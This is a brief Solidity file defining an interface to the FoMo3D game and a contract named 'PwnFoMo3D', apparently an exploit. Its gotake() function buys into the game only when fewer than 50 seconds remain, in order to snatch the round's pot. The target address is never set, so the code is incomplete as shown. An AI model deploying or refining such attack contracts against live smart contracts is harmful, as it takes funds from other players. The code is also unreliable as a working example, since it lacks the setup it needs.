
interface FoMo3DlongInterface {
  function getBuyPrice() public view returns(uint256);
  function getTimeLeft() public view returns(uint256);
}


contract PwnFoMo3D {

    FoMo3DlongInterface fomo3d;

    function gotake() public  {
        if (fomo3d.getTimeLeft() > 50) { revert(); }
        address(fomo3d).call.value(fomo3d.getBuyPrice() * 2)();
    }
}
